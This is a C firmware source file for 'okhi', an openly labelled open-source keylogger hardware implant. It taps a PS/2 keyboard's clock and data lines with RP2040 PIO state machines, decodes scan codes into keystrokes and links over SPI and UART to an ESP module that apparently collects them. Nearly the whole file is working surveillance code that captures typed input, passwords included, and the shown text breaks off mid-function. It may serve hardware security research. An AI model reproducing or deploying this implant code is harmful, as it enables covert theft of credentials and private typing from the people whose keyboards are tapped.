/*
MIT License - okhi - Open Keylogger Hardware Implant
---------------------------------------------------------------------------
Copyright (c) [2024] by David Reguera Garcia aka Dreg 
https://github.com/therealdreg/okhi
https://www.rootkit.es
X @therealdreg
dreg@rootkit.es
---------------------------------------------------------------------------
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
---------------------------------------------------------------------------
WARNING: BULLSHIT CODE X-)
---------------------------------------------------------------------------
There might still be some code/deadcode from this project 
(I've changed a lot of things): https://github.com/lurk101/ps2kbd-lib
*/


// This project assumes that copy_to_ram is enabled, so ALL code is running from RAM

#include <stdio.h>
#include <string.h>
#include "pico/stdlib.h"
#include "pico/bootrom.h"
#include "pico/multicore.h"
#include "hardware/uart.h"
#include "hardware/irq.h"
#include "hardware/pll.h"
#include "hardware/clocks.h"
#include "hardware/structs/pll.h"
#include "hardware/structs/clocks.h"
#include "hardware/pio.h"
#include "hardware/spi.h"
#include "hardware/clocks.h"
#include "hardware/pio.h"
#include "hardware/flash.h"
#include "hardware/timer.h"
#include "okhi.pio.h"
#include "../../../../last_firmv.h"

// uncomment to enable dev build
#define DEV_BUILD 1

// for UART debugging on devboard & HW version detection
#define GPIO_A 4
#define GPIO_B 5

#define BP()   __asm("bkpt #1"); // breakpoint via software macro

#ifndef FLASH_PAGE_SIZE
#define FLASH_PAGE_SIZE 256    
#endif    
#ifndef FLASH_SECTOR_SIZE
#define FLASH_SECTOR_SIZE 4096
#endif   
#define FLASH_TOTAL_SIZE (16 * 1024 * 1024) 

#define UART_BAUD 921600 // 460800 // 230400 // 115200
#define UART_ID uart1
#define UART_TX_PIN 4
#define UART_RX_PIN 5
#define DATA_BITS 8
#define STOP_BITS 1
#define PARITY UART_PARITY_NONE

#define SPI_BAUD 5000000 // ~4.6 mhz 
#define SPI_ID spi1
#define SPI_SCK_PIN 10
#define SPI_MOSI_PIN 11
#define SPI_MISO_PIN 12
#define SPI_CS_PIN 13

// Must be in that order
#define AUX_H2D_JMP_GPIO 19 // PIO JMP HELPER PIN FOR HOST TO DEVICE PIO (must be a free GPIO pin)
#define DAT_GPIO 20 // PS/2 data
#define CLK_GPIO 21 // PS/2 clock
#define AUX_D2H_JMP_GPIO 22 // PIO JMP HELPER PIN FOR DEVICE TO HOST PIO (must be a free GPIO pin)
#define EBOOT_MASTERDATAREADY_GPIO 14
#define ELOG_SLAVEREADY_GPIO  15
#define ESP_RESET_GPIO  28

#define BS 0x8
#define TAB 0x9
#define LF 0xA
#define ESC 0x1B

/* 
Attempting to achieve the minimum necessary delay for the ESP Slave SPI CS signal
-
90 NOP at 125 MHz = 0.72 us. Our SPI runs at ~5 MHz, so 0.72 us is a delay of approximately 3.6 SPI clock cycles.
Overclocking CPU frequency to 250 MHz reduces NOP execution time to 0.36 us,
corresponding to approximately 1.8 SPI clock cycles.
-
https://github.com/espressif/esp-idf/blob/v5.2.2/examples/peripherals/spi_slave/sender/main/app_main.c
spi_device_interface_config_t devcfg = {
...
        .cs_ena_posttrans = 3,     
...
Keep the CS low 3 cycles after transaction, 
to stop slave from missing the last bit when CS has less propagation delay than CLK
*/
#define delay_cs() asm volatile(\
    "nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t" \
    "nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t" \
    "nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t" \
    "nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t" \
    "nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t" \
    "nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t" \
    "nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t" \
    "nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t" \
    "nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t" \
);

#define delay_cs_pre() delay_cs();
#define delay_cs_pos() delay_cs();
#define CS_LOW() \
    asm volatile("nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop"); \
    gpio_put(SPI_CS_PIN, false); \
    delay_cs_pre();
#define CS_HIGH() \
    delay_cs_pos(); \
    gpio_put(SPI_CS_PIN, true); \
    asm volatile("nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop");


typedef enum 
{
    VERSION_00 = 0,
    VERSION_01,
    VERSION_10,
    VERSION_11,
    VERSION_FF,
    VERSION_0F,
    VERSION_1F,
    VERSION_F0,
    VERSION_F1,
    VERSION_UNKNOWN
} hw_version_t;

typedef enum 
{
    PIN_STATE_LOW = 0,
    PIN_STATE_HIGH,
    PIN_STATE_FLOATING
} pin_state_t;


extern char __flash_binary_end;

// Upper-Case ASCII codes by keyboard-code index, 16 elements per row
static const uint8_t lower[] = 
{
    0,  0,   0,   0,   0,   0,   0,   0,  0,  0,   0,   0,   0,   TAB, '`', 0,
    0,  0,   0,   0,   0,   'q', '1', 0,  0,  0,   'z', 's', 'a', 'w', '2', 0,
    0,  'c', 'x', 'd', 'e', '4', '3', 0,  0,  ' ', 'v', 'f', 't', 'r', '5', 0,
    0,  'n', 'b', 'h', 'g', 'y', '6', 0,  0,  0,   'm', 'j', 'u', '7', '8', 0,
    0,  ',', 'k', 'i', 'o', '0', '9', 0,  0,  '.', '/', 'l', ';', 'p', '-', 0,
    0,  0,   '\'',0,   '[', '=', 0,   0,  0,  0,   LF,  ']', 0,   '\\',0,   0,
    0,  0,   0,   0,   0,   0,   BS,  0,  0,  0,   0,   0,   0,   0,   0,   0,
    0,  0,   0,   0,   0,   0,   ESC, 0,  0,  0,   0,   0,   0,   0,   0,   0 
};

// Upper-Case ASCII codes by keyboard-code index
static const uint8_t upper[] = 
{
    0,  0,   0,   0,   0,   0,   0,   0,  0,  0,   0,   0,   0,   TAB, '~', 0,
    0,  0,   0,   0,   0,   'Q', '!', 0,  0,  0,   'Z', 'S', 'A', 'W', '@', 0,
    0,  'C', 'X', 'D', 'E', '$', '#', 0,  0,  ' ', 'V', 'F', 'T', 'R', '%', 0,
    0,  'N', 'B', 'H', 'G', 'Y', '^', 0,  0,  0,   'M', 'J', 'U', '&', '*', 0,
    0,  '<', 'K', 'I', 'O', ')', '(', 0,  0,  '>', '?', 'L', ':', 'P', '_', 0,
    0,  0,   '"', 0,   '{', '+', 0,   0,  0,  0,   LF,  '}', 0,   '|', 0,   0,
    0,  0,   0,   0,   0,   0,   BS,  0,  0,  0,   0,   0,   0,   0,   0,   0,
    0,  0,   0,   0,   0,   0,   ESC, 0,  0,  0,   0,   0,   0,   0,   0,   0
};

volatile static uint8_t release; 
volatile static uint8_t shift;   
volatile static uint8_t ascii;  

volatile static uint kbd_h2d_sm;
volatile static uint offset_kbd_h2d;
volatile static uint kbd_sm;      
volatile static uint offset_kbd;
volatile static int inhnr;
volatile static bool last_state_idle;
volatile static int inidle;
volatile static int inidletoggle;
volatile static bool inh_fired;
volatile char* hwver_name = "UNKNOWN";
volatile static hw_version_t hwver = VERSION_UNKNOWN;


pin_state_t get_pin_state(uint gpio)
{
    gpio_init(gpio);
    gpio_pull_up(gpio);
    sleep_ms(5);
    bool pull_up_state = gpio_get(gpio);
    
    gpio_pull_down(gpio);
    sleep_ms(5);
    bool pull_down_state = gpio_get(gpio);

    gpio_deinit(gpio);

    if (pull_up_state && !pull_down_state)
        return PIN_STATE_FLOATING;
    
    return pull_up_state ? PIN_STATE_HIGH : PIN_STATE_LOW;
}

hw_version_t detect_hw_version(void) 
{
    pin_state_t state_a = get_pin_state(GPIO_A);
    pin_state_t state_b = get_pin_state(GPIO_B);

    if (state_a == PIN_STATE_FLOATING && state_b == PIN_STATE_FLOATING)
        return VERSION_FF;
    else if (state_a == PIN_STATE_LOW && state_b == PIN_STATE_FLOATING)
        return VERSION_0F;
    else if (state_a == PIN_STATE_HIGH && state_b == PIN_STATE_FLOATING)
        return VERSION_1F;
    else if (state_a == PIN_STATE_FLOATING && state_b == PIN_STATE_LOW)
        return VERSION_F0;
    else if (state_a == PIN_STATE_FLOATING && state_b == PIN_STATE_HIGH)
        return VERSION_F1;
    else if (state_a == PIN_STATE_LOW && state_b == PIN_STATE_LOW)
        return VERSION_00;
    else if (state_a == PIN_STATE_LOW && state_b == PIN_STATE_HIGH)
        return VERSION_01;
    else if (state_a == PIN_STATE_HIGH && state_b == PIN_STATE_LOW)
        return VERSION_10;
    else if (state_a == PIN_STATE_HIGH && state_b == PIN_STATE_HIGH)
        return VERSION_11;
    else
        return VERSION_UNKNOWN;
}

int init_ver(void) 
{
    hwver = detect_hw_version();

    switch (hwver) 
    {
        case VERSION_00:
            hwver_name = "00";
            printf("Hardware version: 00\n");
        break;
    
        case VERSION_01:
            hwver_name = "01";
            printf("Hardware version: 01\n");
        break;
    
        case VERSION_10:
            hwver_name = "10";
            printf("Hardware version: 10\n");
        break;
    
        case VERSION_11:
            hwver_name = "11";
            printf("Hardware version: 11\n");
        break;
    
        case VERSION_FF:
            hwver_name = "FF";
            printf("Hardware version: FF (both floating)\n");
        break;
    
        case VERSION_0F:
            hwver_name = "0F";
            printf("Hardware version: 0F (A low, B floating)\n");
        break;
    
        case VERSION_1F:
            hwver_name = "1F";
            printf("Hardware version: 1F (A high, B floating)\n");
        break;
    
        case VERSION_F0:
            hwver_name = "F0";
            printf("Hardware version: F0 (A floating, B low)\n");
        break;
    
        case VERSION_F1:
            hwver_name = "F1";
            printf("Hardware version: F1 (A floating, B high)\n");
        break;
    
        default:
            hwver_name = "UK";
            printf("Hardware version: Unknown\n");
        break;
    }

    return 0;
}

int my_spi_write_blocking(const uint8_t *src, size_t len)
{
    CS_LOW();
    int retf = spi_write_blocking(SPI_ID, src, len);
    CS_HIGH();

    return retf;
}

int my_spi_read_blocking(uint8_t *dst, size_t len)
{
    CS_LOW();
    // repeated_tx_data is output repeatedly on TX as data is read in from RX. Generally this can be 0
    int retf = spi_read_blocking(SPI_ID, 0, dst, len);
    CS_HIGH();

    return retf;
}

int my_spi_write_read_blocking(const uint8_t *src, uint8_t *dst, size_t len)
{
    CS_LOW();
    int retf = spi_write_read_blocking(SPI_ID, src, dst, len);
    CS_HIGH();

    return retf;
}

int __attribute__((noinline)) kbd_ready(void) 
{
    if (ascii) // We might already have a character
        return ascii;
    if (pio_sm_is_rx_fifo_empty(pio0, kbd_sm))
        return 0; // no new codes in the fifo
    // pull a scan code from the PIO SM fifo
    uint8_t code = *((io_rw_8*)&pio0->rxf[kbd_sm] + 3);
    switch (code)
    {
        case 0xF0:               // key-release code 0xF0 detected
            release = 1;         // set release
            break;               // go back to start
        case 0x12:               // Left-side SHIFT key detected
        case 0x59:               // Right-side SHIFT key detected
            if (release)
            {       // L or R Shift detected, test release
                shift = 0;       // Key released preceded  this Shift, so clear shift
                release = 0;     // Clear key-release flag
            } 
            else
                shift = 1; // No previous Shift detected before now, so set Shift_Key flag now
            break;
        default:
            // no case applies
            if (!release)                              // If no key-release detected yet
                ascii = (shift ? upper : lower)[code]; // Get ASCII value by case
            release = 0;
            break;
    }
    return ascii;
}

char kbd_getc(void) 
{
    char c;
    while (!(c = kbd_ready()))
    {
        tight_loop_contents();
    }
    ascii = 0;
    return c;
}

typedef enum 
{
	GSYR_OK = 0,
	GSYR_ERROR,
	GSYR_NEED_MORE_BYTES = 1,
	
} get_sym_ret_t;

get_sym_ret_t get_sym(unsigned char* buff, size_t size, unsigned char** next, bool* press, char** sym)
{
	if (size == 0 || buff == NULL || next == NULL || press == NULL || sym == NULL)
	{
		return GSYR_ERROR;
	}

	*press = true;
	
	// 0xE1 Special only press case
	if (*buff == 0xE1)
	{
		if (size < 8)
		{
			return GSYR_NEED_MORE_BYTES;
		}
		
		if (   buff[1] == 0x14 && buff[2] == 0x77
			&& buff[3] == 0xE1 && buff[4] == 0xF0 
			&& buff[5] == 0x14 && buff[6] == 0xF0
			&& buff[7] == 0x77)
		{
			 *next = buff + 8; *sym = "<PAUSE>"; return GSYR_OK;
		}
			
		return GSYR_ERROR;
	}
	
	// Handle release case & 0xE0 case (press & releases)
	if (*buff == 0xF0 || *buff == 0xE0)
	{
		if (size == 1)
		{
			return GSYR_NEED_MORE_BYTES;
		}
		
		if (*buff == 0xF0)
		{
			*press = false;
			buff++;
		}
		else if (*buff == 0xE0)
		{
			buff++;
			if (*buff == 0xF0)
			{
				*press = false;
				if (size == 2)
				{
					return GSYR_NEED_MORE_BYTES;
				}
				buff++;

                if (*buff == 0x7C)
                {
                    if (size < 6)
                    {
                        return GSYR_NEED_MORE_BYTES;
                    }
                    if (buff[1] == 0xE0 && buff[2] == 0xF0 && buff[3] == 0x12)
                    {
                        *next = buff + 4; *sym = "<PRNTSCR>"; return GSYR_OK;
                    }

                }
			}
			
			// 0xE0 parsing
			switch (*buff)
			{
                case 0x12:                 
                    if (size == 3)
                    {
                        return GSYR_NEED_MORE_BYTES;
                    }
                    if (buff[1] == 0xE0 && buff[2] == 0x7C) 
                    {
                        *next = buff + 3; *sym = "<PRNTSCR>"; return GSYR_OK;
                    }
                    return GSYR_ERROR;
				case 0x1F: *next = buff + 1; *sym = "<LGUI>"; return GSYR_OK;
				case 0x14: *next = buff + 1; *sym = "<RCTRL>"; return GSYR_OK;
				case 0x27: *next = buff + 1; *sym = "<RGUI>"; return GSYR_OK;
				case 0x11: *next = buff + 1; *sym = "<RALT>"; return GSYR_OK;
				case 0x2F: *next = buff + 1; *sym = "<APPS>"; return GSYR_OK;
				case 0x70: *next = buff + 1; *sym = "<INSERT>"; return GSYR_OK;
				case 0x6C: *next = buff + 1; *sym = "<HOME>"; return GSYR_OK;
				case 0x7D: *next = buff + 1; *sym = "<PGUP>"; return GSYR_OK;
				case 0x71: *next = buff + 1; *sym = "<DEL>"; return GSYR_OK;
				case 0x69: *next = buff + 1; *sym = "<END>"; return GSYR_OK;
				case 0x7A: *next = buff + 1; *sym = "<PGDN>"; return GSYR_OK;
				case 0x75: *next = buff + 1; *sym = "<UROW>"; return GSYR_OK;
				case 0x6B: *next = buff + 1; *sym = "<LROW>"; return GSYR_OK;
				case 0x72: *next = buff + 1; *sym = "<DROW>"; return GSYR_OK;
				case 0x74: *next = buff + 1; *sym = "<RROW>"; return GSYR_OK;
				case 0x4A: *next = buff + 1; *sym = "/"; return GSYR_OK;
				case 0x5A: *next = buff + 1; *sym = "<EN>"; return GSYR_OK;
				case 0x37: *next = buff + 1; *sym = "<PWR>"; return GSYR_OK;
				case 0x3F: *next = buff + 1; *sym = "<SLEEP>"; return GSYR_OK;
				case 0x5E: *next = buff + 1; *sym = "<WAKE>"; return GSYR_OK;
				case 0x4D: *next = buff + 1; *sym = "<NTRACK>"; return GSYR_OK;
				case 0x15: *next = buff + 1; *sym = "<PTRACK>"; return GSYR_OK;
				case 0x3B: *next = buff + 1; *sym = "<STOP>"; return GSYR_OK;
				case 0x34: *next = buff + 1; *sym = "<PLAY/PAUSE>"; return GSYR_OK;
				case 0x23: *next = buff + 1; *sym = "<MUTE>"; return GSYR_OK;
				case 0x32: *next = buff + 1; *sym = "<VOLUP>"; return GSYR_OK;
				case 0x21: *next = buff + 1; *sym = "<VOLDOWN>"; return GSYR_OK;
				case 0x50: *next = buff + 1; *sym = "<MEDIASEL>"; return GSYR_OK;
				case 0x48: *next = buff + 1; *sym = "<MAIL>"; return GSYR_OK;
				case 0x2B: *next = buff + 1; *sym = "<CALC>"; return GSYR_OK;
				case 0x40: *next = buff + 1; *sym = "<MYPC>"; return GSYR_OK;
				case 0x10: *next = buff + 1; *sym = "<WWWSEARCH>"; return GSYR_OK;
				case 0x3A: *next = buff + 1; *sym = "<WWWHOME>"; return GSYR_OK;
				case 0x38: *next = buff + 1; *sym = "<WWWBACK>"; return GSYR_OK;
				case 0x30: *next = buff + 1; *sym = "<WWWFORWARD>"; return GSYR_OK;
				case 0x28: *next = buff + 1; *sym = "<WWWSTOP>"; return GSYR_OK;
				case 0x20: *next = buff + 1; *sym = "<WWWREFRESH>"; return GSYR_OK;
				case 0x18: *next = buff + 1; *sym = "<WWWFAV>"; return GSYR_OK;
			}
			return GSYR_ERROR;
		}
			
	}

	switch (*buff)
	{
		case 0x1C: *next = buff + 1; *sym = "A"; return GSYR_OK;
		case 0x32: *next = buff + 1; *sym = "B"; return GSYR_OK;
		case 0x21: *next = buff + 1; *sym = "C"; return GSYR_OK;
		case 0x23: *next = buff + 1; *sym = "D"; return GSYR_OK;
		case 0x24: *next = buff + 1; *sym = "E"; return GSYR_OK;
		case 0x2B: *next = buff + 1; *sym = "F"; return GSYR_OK;
		case 0x34: *next = buff + 1; *sym = "G"; return GSYR_OK;
		case 0x33: *next = buff + 1; *sym = "H"; return GSYR_OK;
		case 0x43: *next = buff + 1; *sym = "I"; return GSYR_OK;
		case 0x3B: *next = buff + 1; *sym = "J"; return GSYR_OK;
		case 0x42: *next = buff + 1; *sym = "K"; return GSYR_OK;
		case 0x4B: *next = buff + 1; *sym = "L"; return GSYR_OK;
		case 0x3A: *next = buff + 1; *sym = "M"; return GSYR_OK;
		case 0x31: *next = buff + 1; *sym = "N"; return GSYR_OK;
		case 0x44: *next = buff + 1; *sym = "O"; return GSYR_OK;
		case 0x4D: *next = buff + 1; *sym = "P"; return GSYR_OK;
		case 0x15: *next = buff + 1; *sym = "Q"; return GSYR_OK;
		case 0x2D: *next = buff + 1; *sym = "R"; return GSYR_OK;
		case 0x1B: *next = buff + 1; *sym = "S"; return GSYR_OK;
		case 0x2C: *next = buff + 1; *sym = "T"; return GSYR_OK;
		case 0x3C: *next = buff + 1; *sym = "U"; return GSYR_OK;
		case 0x2A: *next = buff + 1; *sym = "V"; return GSYR_OK;
		case 0x1D: *next = buff + 1; *sym = "W"; return GSYR_OK;
		case 0x22: *next = buff + 1; *sym = "X"; return GSYR_OK;
		case 0x35: *next = buff + 1; *sym = "Y"; return GSYR_OK;
		case 0x1A: *next = buff + 1; *sym = "Z"; return GSYR_OK;
		case 0x45: *next = buff + 1; *sym = "0"; return GSYR_OK;
		case 0x16: *next = buff + 1; *sym = "1"; return GSYR_OK;
		case 0x1E: *next = buff + 1; *sym = "2"; return GSYR_OK;
		case 0x26: *next = buff + 1; *sym = "3"; return GSYR_OK;
		case 0x25: *next = buff + 1; *sym = "4"; return GSYR_OK;
		case 0x2E: *next = buff + 1; *sym = "5"; return GSYR_OK;
		case 0x36: *next = buff + 1; *sym = "6"; return GSYR_OK;
		case 0x3D: *next = buff + 1; *sym = "7"; return GSYR_OK;
		case 0x3E: *next = buff + 1; *sym = "8"; return GSYR_OK;
		case 0x46: *next = buff + 1; *sym = "9"; return GSYR_OK;
		case 0x0E: *next = buff + 1; *sym = "`"; return GSYR_OK;
		case 0x4E: *next = buff + 1; *sym = "-"; return GSYR_OK;
		case 0x55: *next = buff + 1; *sym = "="; return GSYR_OK;
		case 0x5D: *next = buff + 1; *sym = "\\"; return GSYR_OK;
		case 0x66: *next = buff + 1; *sym = "<BKSP>"; return GSYR_OK;
		case 0x29: *next = buff + 1; *sym = "<SPACE>"; return GSYR_OK;
		case 0x0D: *next = buff + 1; *sym = "<TAB>"; return GSYR_OK;
		case 0x58: *next = buff + 1; *sym = "<CAPS>"; return GSYR_OK;
		case 0x12: *next = buff + 1; *sym = "<LSHIFT>"; return GSYR_OK;
		case 0x14: *next = buff + 1; *sym = "<LCTRL>"; return GSYR_OK;
		case 0x11: *next = buff + 1; *sym = "<LALT>"; return GSYR_OK;
		case 0x59: *next = buff + 1; *sym = "<RSHIFT>"; return GSYR_OK;
		case 0x5A: *next = buff + 1; *sym = "<ENTER>"; return GSYR_OK;
		case 0x76: *next = buff + 1; *sym = "<ESC>"; return GSYR_OK;
		case 0x05: *next = buff + 1; *sym = "<F1>"; return GSYR_OK;
		case 0x06: *next = buff + 1; *sym = "<F2>"; return GSYR_OK;
		case 0x04: *next = buff + 1; *sym = "<F3>"; return GSYR_OK;
		case 0x0C: *next = buff + 1; *sym = "<F4>"; return GSYR_OK;
		case 0x03: *next = buff + 1; *sym = "<F5>"; return GSYR_OK;
		case 0x0B: *next = buff + 1; *sym = "<F6>"; return GSYR_OK;
		case 0x83: *next = buff + 1; *sym = "<F7>"; return GSYR_OK;
		case 0x0A: *next = buff + 1; *sym = "<F8>"; return GSYR_OK;
		case 0x01: *next = buff + 1; *sym = "<F9>"; return GSYR_OK;
		case 0x09: *next = buff + 1; *sym = "<F10>"; return GSYR_OK;
		case 0x78: *next = buff + 1; *sym = "<F11>"; return GSYR_OK;
		case 0x07: *next = buff + 1; *sym = "<F12>"; return GSYR_OK;
		case 0x7E: *next = buff + 1; *sym = "<SCROLL>"; return GSYR_OK;
		case 0x54: *next = buff + 1; *sym = "["; return GSYR_OK;
		case 0x77: *next = buff + 1; *sym = "<NUM>"; return GSYR_OK;
		case 0x7C: *next = buff + 1; *sym = "*"; return GSYR_OK;
		case 0x7B: *next = buff + 1; *sym = "-"; return GSYR_OK;
		case 0x79: *next = buff + 1; *sym = "+"; return GSYR_OK;
		case 0x71: *next = buff + 1; *sym = "."; return GSYR_OK;
		case 0x70: *next = buff + 1; *sym = "0"; return GSYR_OK;
		case 0x69: *next = buff + 1; *sym = "1"; return GSYR_OK;
		case 0x72: *next = buff + 1; *sym = "2"; return GSYR_OK;
		case 0x7A: *next = buff + 1; *sym = "3"; return GSYR_OK;
		case 0x6B: *next = buff + 1; *sym = "4"; return GSYR_OK;
		case 0x73: *next = buff + 1; *sym = "5"; return GSYR_OK;
		case 0x74: *next = buff + 1; *sym = "6"; return GSYR_OK;
		case 0x6C: *next = buff + 1; *sym = "7"; return GSYR_OK;
		case 0x75: *next = buff + 1; *sym = "8"; return GSYR_OK;
		case 0x7D: *next = buff + 1; *sym = "9"; return GSYR_OK;
		case 0x5B: *next = buff + 1; *sym = "]"; return GSYR_OK;
		case 0x4C: *next = buff + 1; *sym = ";"; return GSYR_OK;
		case 0x52: *next = buff + 1; *sym = "'"; return GSYR_OK;
		case 0x41: *next = buff + 1; *sym = ","; return GSYR_OK;
		case 0x49: *next = buff + 1; *sym = "."; return GSYR_OK;
		case 0x4A: *next = buff + 1; *sym = "/"; return GSYR_OK;
	}
	
	return GSYR_ERROR;
}

unsigned char* get_base_flash_space_addr(void)
{
    return (unsigned char*)XIP_BASE;
}

uint32_t get_start_free_flash_space_addr(void)
{
    return ((((uint32_t)XIP_BASE) + ((uint32_t)__flash_binary_end) + (FLASH_PAGE_SIZE - 1)) & ~(FLASH_PAGE_SIZE - 1));
}

uint32_t get_flash_end_address(void) 
{
    return ((((((uint32_t)XIP_BASE)) + (PICO_FLASH_SIZE_BYTES - 1)) + (FLASH_PAGE_SIZE - 1)) & ~(FLASH_PAGE_SIZE - 1));
}

uint32_t get_free_flash_space(void) 
{
    return get_flash_end_address() - get_start_free_flash_space_addr();
}

void erase_flash(void) 
{
   flash_range_erase(0, PICO_FLASH_SIZE_BYTES);
   reset_usb_boot(0, 0);
}

void start_device_to_host_sm(void)
{
    gpio_put(AUX_D2H_JMP_GPIO, false);
    pio_sm_exec(pio0, kbd_sm, pio_encode_jmp(offset_kbd));
}

void stop_device_to_host_sm(void)
{
    gpio_put(AUX_D2H_JMP_GPIO, true);
    //pio_sm_restart(pio0, kbd_sm);
    //pio_sm_clkdiv_restart(pio0, kbd_sm);
    pio_sm_exec(pio0, kbd_sm, pio_encode_jmp(offset_kbd));
    pio_sm_clear_fifos(pio0, kbd_sm);
}

void start_host_to_device_sm(void)
{
    gpio_put(AUX_H2D_JMP_GPIO, false);
    pio_sm_exec(pio1, kbd_h2d_sm, pio_encode_jmp(offset_kbd_h2d));
    pio_sm_clear_fifos(pio1, kbd_h2d_sm);
}

void stop_host_to_device_sm(void)
{
    gpio_put(AUX_H2D_JMP_GPIO, true);
    //pio_sm_restart(pio1, kbd_h2d_sm);
    //pio_sm_clkdiv_restart(pio1, kbd_h2d_sm);
    pio_sm_exec(pio1, kbd_h2d_sm, pio_encode_jmp(offset_kbd_h2d));
    pio_sm_clear_fifos(pio1, kbd_h2d_sm);
}


// IRQ0: Inhibited communication detected
// IRQ1: No Host Request-to-Send detected after inhibiting communication
void pio0_irq(void) 
{
    //printf("PIO0 IRQ!\r\n");
    if (pio0_hw->irq & 1) 
    {
        //printf("PIO0 IRQ & 1: %d\r\n", inhnr++);
        pio0_hw->irq = 1;
        stop_device_to_host_sm();
        start_host_to_device_sm();
    } 
    else if (pio0_hw->irq & 2) 
    {
        //printf("PIO0 IRQ & 2: %d\r\n", inhnr++);
        pio0_hw->irq = 2;
        start_device_to_host_sm();
        stop_host_to_device_sm();
    }
}

// IRQ0: IDLE DETECTED, CLOCK is HIGH + DAT is HIGH for at least 100 microseconds
// IRQ1: NOT IDLE DETECTED
void pio1_irq(void) 
{
    //printf("PIO1 IRQ!\r\n");
    if (pio1_hw->irq & 1) 
    {
        //printf("PIO1 IRQ & 1: %d\r\n", inidle++);
        pio1_hw->irq = 1;
        start_device_to_host_sm();
        stop_host_to_device_sm();
    } 
    else if (pio1_hw->irq & 2) 
    {
        //printf("PIO1 IRQ & 2: %d\r\n", inidle++);
        pio1_hw->irq = 2;
    }
}

// COMMENT BELOW LINE TO DISABLE GLITCH DETECTION
//#define ENABLE_GLITCH_DETECTOR 
#define RING_BUFF_MAX_ENTRIES 800
volatile static unsigned int write_index = 0;
volatile static char ringbuff[RING_BUFF_MAX_ENTRIES][32];

#ifdef ENABLE_GLITCH_DETECTOR
#define GLITCH_DETECTION_THRESHOLD 15
typedef struct 
{
    volatile bool signal_detected;
    volatile absolute_time_t last_rising_edge;
    volatile int64_t pulse_width_us;
} pin_state_glitch_t;
volatile pin_state_glitch_t pin_states_glitch[2];  
void gpio_callback(uint gpio, uint32_t events) 
{
    int pin_index = -1;
    if (gpio == DAT_GPIO) 
    {
        pin_index = 0;  
    } 
    else if (gpio == CLK_GPIO) 
    {
        pin_index = 1; 
    }
    else 
    {
        return;
    }
    if (pin_states_glitch[pin_index].signal_detected)
    {
        return;
    }
    if (events & GPIO_IRQ_EDGE_RISE) 
    {
        pin_states_glitch[pin_index].last_rising_edge = get_absolute_time();
    } 
    else if (events & GPIO_IRQ_EDGE_FALL) 
    {
        pin_states_glitch[pin_index].pulse_width_us = absolute_time_diff_us(pin_states_glitch[pin_index].last_rising_edge, get_absolute_time());
        if (pin_states_glitch[pin_index].pulse_width_us < GLITCH_DETECTION_THRESHOLD) 
        {
            pin_states_glitch[pin_index].signal_detected = true;
        }
    }
}
#endif // ENABLE_GLITCH_DETECTOR


__attribute__((section(".uninitialized_data"))) uint32_t wait_20;

void gpio_callback(uint gpio, uint32_t events) {
    // For devboard :D
    if (gpio == ESP_RESET_GPIO) 
    {
        gpio_init(ESP_RESET_GPIO);
        gpio_set_dir(ESP_RESET_GPIO, GPIO_IN);
        gpio_init(EBOOT_MASTERDATAREADY_GPIO);
        gpio_set_dir(EBOOT_MASTERDATAREADY_GPIO, GPIO_IN);
        gpio_init(ELOG_SLAVEREADY_GPIO);
        gpio_set_dir(ELOG_SLAVEREADY_GPIO, GPIO_IN);

        wait_20 = 0x69699696;
        puts("\r\nexternal ESP-RESET detected!\r\nrebooting in 20 secs!!!\r\n");
        watchdog_reboot(0, 0, 0);
    }
}

void core1_main()
{
    #ifdef ENABLE_GLITCH_DETECTOR
    gpio_set_irq_enabled_with_callback(DAT_GPIO, GPIO_IRQ_EDGE_RISE | GPIO_IRQ_EDGE_FALL, true, &gpio_callback);
    gpio_set_irq_enabled_with_callback(CLK_GPIO, GPIO_IRQ_EDGE_RISE | GPIO_IRQ_EDGE_FALL, true, &gpio_callback);
    #endif // ENABLE_GLITCH_DETECTOR

    sleep_ms(2000);
    gpio_init(ESP_RESET_GPIO);
    gpio_set_dir(ESP_RESET_GPIO, GPIO_IN);
    gpio_pull_up(ESP_RESET_GPIO);
    sleep_ms(2000);

    gpio_set_irq_enabled_with_callback(ESP_RESET_GPIO, GPIO_IRQ_EDGE_FALL, true, &gpio_callback);

    uart_init(uart0, 74880);
    gpio_set_function(16, GPIO_FUNC_UART);
    gpio_set_function(17, GPIO_FUNC_UART);
    // UART 8N1: 1 start bit, 8 data bits, no parity bit, 1 stop bit
    uart_set_hw_flow(uart0, false, false);
    uart_set_format(uart0, DATA_BITS, STOP_BITS, PARITY);
    uart_set_fifo_enabled(uart0, false);
    uart_set_irq_enables(uart0, false, false);

    gpio_init(ELOG_SLAVEREADY_GPIO);
